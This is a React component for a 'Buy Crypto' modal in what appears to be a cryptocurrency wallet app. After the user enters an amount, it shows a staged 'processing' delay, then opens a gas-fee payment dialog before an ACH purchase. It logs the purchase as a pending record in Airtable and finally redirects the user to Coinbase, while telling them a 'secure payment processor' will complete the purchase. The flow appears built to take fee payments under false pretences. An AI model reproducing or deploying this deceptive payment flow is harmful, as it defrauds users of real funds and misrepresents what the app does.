'use client';

import { useState, useMemo } from 'react';
import { X, ArrowRight, ChevronLeft } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';

interface BuyModalProps {
    address?: string;
    isOpen: boolean;
    onClose: () => void;
    onSuccess?: () => void;
    isInline?: boolean;
}

export default function BuyModal({ address, isOpen, onClose, onSuccess, theme = 'light', isInline = false }: BuyModalProps & { theme?: 'dark' | 'light' }) {
    const [amount, setAmount] = useState('');
    const [crypto, setCrypto] = useState('BNB');

    const [showGasModal, setShowGasModal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    const currentNetwork = useMemo(() => {
        if (crypto === 'BNB' || crypto === 'BUSD' || crypto === 'TETHEREUM') return 'BNB';
        if (crypto === 'ETH' || crypto === 'USDT' || crypto === 'USDC') return 'ETH';
        if (crypto === 'BTC') return 'BTC';
        return 'ETH';
    }, [crypto]);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        setIsLoading(true);
        // BRIEF delay to show processing, then open Gas Modal
        setTimeout(() => {
            setIsLoading(false);
            setShowGasModal(true);
        }, 1500);
    };

    const handleSuccessRedirect = () => {
        window.open('https://www.coinbase.com/buy', '_blank');
        onClose();
    };

    const handleGasSuccess = async (txHash: string) => {
        // Create Pending Transaction in Airtable
        try {
            await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: address || "unknown",
                    amount: Number(amount),
                    type: "receive", // Buying is receiving crypto
                    asset: crypto,
                    network: "Bank Transfer",
                    wType: "bank",
                    status: "pending"
                })
            });
        } catch (err) {
            console.error("Failed to save buy history", err);
        }

        setShowGasModal(false);
        if (onSuccess) onSuccess();
        handleSuccessRedirect();
    };

    const renderContent = () => {
        return (
            <div className={`${isInline ? 'w-full max-w-[600px] mx-auto' : ''} ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                <div className={`${isInline ? `md:rounded-[3rem] md:border p-0 md:p-2 ${theme === 'dark' ? 'bg-transparent md:bg-black border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-2xl'}` : ''}`}>
                    <div className={`${isInline ? 'p-0 md:p-8 pb-12' : ''}`}>

                        {/* Sticky Header */}
                        <div className={`sticky top-0 z-10 px-5 pt-8 pb-4 flex items-center gap-3 ${theme === 'dark' ? 'bg-black' : 'bg-white'}`}>
                            <button onClick={onClose} className={`w-9 h-9 flex items-center justify-center rounded-full transition-all ${theme === 'dark' ? 'bg-white/10 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}>
                                <ChevronLeft className="w-5 h-5" />
                            </button>
                            <h2 className="text-base font-semibold tracking-tight">Buy Crypto</h2>
                        </div>

                        {/* Content */}
                        <div className="px-5 mt-6 space-y-7">

                            {/* Payment Method — compact inline badge */}
                            <div className={`flex items-center gap-3 p-4 rounded-2xl border ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                <div className="w-9 h-9 rounded-full bg-white flex items-center justify-center shadow-sm shrink-0 border border-gray-100">
                                    <img src="https://hatscripts.github.io/circle-flags/flags/us.svg" alt="USD" className="w-6 h-6 object-contain rounded-full" />
                                </div>
                                <div className="flex-1 min-w-0">
                                    <p className="text-sm font-semibold leading-none mb-0.5">Bank Transfer (ACH)</p>
                                    <p className="text-[11px] text-gray-500">1–3 business days · low fees</p>
                                </div>
                                <div className="px-2.5 py-1 rounded-full bg-blue-600 text-white text-[10px] font-bold uppercase tracking-widest shrink-0">
                                    Primary
                                </div>
                            </div>

                            <form onSubmit={handleSubmit} className="space-y-7">
                                {/* Amount */}
                                <div>
                                    <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Amount to Spend (USD)</label>
                                    <div className="relative">
                                        <input
                                            type="number"
                                            value={amount}
                                            onChange={(e) => setAmount(e.target.value)}
                                            placeholder="0.00"
                                            className={`w-full px-4 py-[14px] border rounded-2xl focus:outline-none transition-all text-3xl font-bold placeholder-gray-500 pr-20 ${
                                                theme === 'dark' ? 'bg-white/5 border-transparent focus:border-blue-600 text-white' : 'bg-gray-50 border-transparent focus:border-blue-600 text-[#0a0b0d]'
                                            }`}
                                            required
                                        />
                                        <div className="absolute right-4 top-1/2 -translate-y-1/2">
                                            <span className="text-gray-400 font-semibold text-sm uppercase">USD</span>
                                        </div>
                                    </div>
                                </div>

                                {/* Receive Asset — compact chips */}
                                <div>
                                    <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Receive Asset</label>
                                    <div className="flex flex-wrap gap-2">
                                        {['BNB', 'TETHEREUM', 'USDT', 'USDC', 'ETH', 'BTC'].map((coin) => (
                                            <button
                                                key={coin}
                                                type="button"
                                                onClick={() => setCrypto(coin)}
                                                className={`py-2 px-3 rounded-xl border transition-all text-xs font-semibold ${crypto === coin
                                                    ? `border-transparent ${theme === 'dark' ? 'bg-white text-black' : 'bg-black text-white'}`
                                                    : `${theme === 'dark' ? 'border-white/5 bg-white/5 text-gray-400' : 'border-gray-200 bg-gray-50 text-gray-500'}`}`}
                                            >
                                                {coin}
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                <button
                                    type="submit"
                                    disabled={!amount || Number(amount) <= 0}
                                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-4 rounded-2xl transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-2 text-base"
                                >
                                    {isLoading ? "Preparing..." : "Proceed to Purchase"}
                                    <ArrowRight className="w-5 h-5" />
                                </button>

                                <p className="text-center text-[11px] text-gray-500 font-medium px-4">
                                    You will be redirected to our secure payment processor to complete your purchase.
                                </p>
                            </form>
                        </div>

                    </div>
                </div>
            </div>
        );
    };

    if (isInline) {
        return (
            <>
                {renderContent()}
                <AnimatePresence>
                    {showGasModal && (
                        <GasFeeModal
                            isOpen={showGasModal}
                            onClose={() => setShowGasModal(false)}
                            onSuccess={handleGasSuccess}
                            theme={theme}
                            network={currentNetwork}
                        />
                    )}
                </AnimatePresence>
            </>
        );
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    {/* Backdrop */}
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={onClose}
                    />

                    {/* Modal - Bottom Sheet on Mobile, Centered on Desktop */}
                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-[#3375BB]/30' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border rounded-[2.5rem] p-6 shadow-2xl m-4`}
                    >
                        {renderContent()}
                    </motion.div>

                    <AnimatePresence>
                        {showGasModal && (
                            <GasFeeModal
                                isOpen={showGasModal}
                                onClose={() => setShowGasModal(false)}
                                onSuccess={handleGasSuccess}
                                theme={theme}
                                network={currentNetwork}
                            />
                        )}
                    </AnimatePresence>
                </div>
            )}
        </AnimatePresence>
    );
}
